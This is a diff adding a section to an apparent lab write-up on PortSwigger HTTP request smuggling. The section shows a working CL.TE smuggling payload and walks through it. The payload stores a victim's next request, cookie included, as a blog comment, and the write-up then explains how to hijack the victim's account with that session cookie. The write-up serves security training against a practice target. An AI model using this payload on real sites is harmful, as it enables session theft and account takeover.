@@ -110,10 +110,94 @@ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 F
 ```
 Submit the exploit a couple of time and you will see that the Lab is solved
 
-
-
 #### Reference
 + https://portswigger.net/web-security/request-smuggling
 + https://portswigger.net/web-security/request-smuggling/finding
 + https://portswigger.net/web-security/request-smuggling/exploiting
+
+### Exploiting HTTP request smuggling to capture other users' requests
+#### LAB
+The lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
+
+To solve the lab, smuggle a request to the back-end server that causes the next user's request to be stored in the application. Then retrieve the next user's request and use the victim user's cookies to access their account.
+Note
+
+<i>Please note that the lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.</i>
+
+Let's analyze the post comment POST request with HTTP Request Smuggler, we can notice that the application seems to be vulnerable:
+```
+Found issue: Possible HTTP Request Smuggling: CL.TE multiCase (delayed response)
+Target: https://0a75002403d9abc0c0441db8007e009e.web-security-academy.net
+Burp issued a request, and got a response. Burp then issued the same request, but with a shorter Content-Length, and got a timeout.
+This suggests that the front-end system is using the Content-Length header, and the backend is using the Transfer-Encoding: chunked header. 
+You should be able to manually verify this using the Repeater, provided you uncheck the 'Update Content-Length' setting on the top menu. 
+<br/>As such, it may be vulnerable to HTTP Desync attacks, aka Request Smuggling. <br/>
+To attempt an actual Desync attack, right click on the attached request and choose 'Desync attack'. Please note that this is not risk-free - other genuine visitors to the site may be affected.<br/><br/>Please refer to the following posts for further information: <br/><a href="https://portswigger.net/blog/http-desync-attacks">https://portswigger.net/blog/http-desync-attacks</a><br/><a href="https://portswigger.net/research/http-desync-attacks-what-happened-next">https://portswigger.net/research/http-desync-attacks-what-happened-next</a><br/><a href="https://portswigger.net/research/breaking-the-chains-on-http-request-smuggler">https://portswigger.net/research/breaking-the-chains-on-http-request-smuggler</a>
+Evidence: 
+======================================
+POST /post/comment HTTP/1.1
+Host: 0a75002403d9abc0c0441db8007e009e.web-security-academy.net
+Cookie: session=2VSJ7sk8dcWS6JGAVkwl7EI32AX59A9m
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 121
+Origin: https://0a75002403d9abc0c0441db8007e009e.web-security-academy.net
+Referer: https://0a75002403d9abc0c0441db8007e009e.web-security-academy.net/post?postId=1
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+Connection: close
+tRANSFER-ENCODING: chunked
+
+68
+csrf=dzLCxmZMqjUlkVw8mh0IwMDPbHK6rNln&postId=1&comment=hey&name=zinzloun&email=zinz%40libero.it&website=
+1
+Z
+Q
+```
+Indeed sending the payload to the back-end server we get an error that confirm that the application is vulnerable
+<br>![img](./img/133.png)<br>
+To reach our goal we can try to craft a payload that will send the following user request to be submitted as comment, that will include the user cookie's session, but before that we have to shift the comment to the endo of the request, so the back-end server will process the somthing similar to the following:
+```
+POST /post/comment HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 500
+Cookie: session=<your session cookie>
+
+csrf=<your csrf token>&postId=1&name=pippo&email=pippo@disney.com&website=&comment=helloGET / HTTP/1.1
+Host: <your lab ID>.web-security-academy.net
+Cookie: session=<next user request cookie session>
+...
+```
+<i>Please note that from now on my lab ID, session cookie and csrf token are changed</i>
+
+The actual whole payload is the following:
+```
+POST / HTTP/1.1
+Host: 0a21005303031c2fc4c8baad008900ec.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 255
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=ZZsK2rpFWaKEUTCA1xArdkZ8lwa7mjzL
+Content-Length: 500
+
+csrf=RDuJHPY0aeoHk4xr17jYAIzuuWk7PhYg&postId=3&name=pippo&email=pippo@disney.com&website=&comment=d
+```
+Here I use the <b>d</b> letter as place-holder, that I will change for every request sent to the back-end. So sending the payload, wait some second and visit the post ID 3, we can see that a post is present containing the request header of the victim (1). The cookie is not included so we have to increase the value of the content length for the POST comment request. I tried with 800 (2)
+<br>![img](./img/134.png)<br>
+Then I struggled a bit to find the right length, since if it exceed the actual length of the victim request we got a server error, after some attempts I found the correct value: <b>783</b>
+<br>![img](./img/135.png)<br>
+Now with session cookie value we cant try to access the my-account page, before doing that enable the Intercept in the Proxy, once you get the request change the cookie value with the one you got in the previous step, forward the request to solve the lab
+<br>![img](./img/136.png)<br>
 
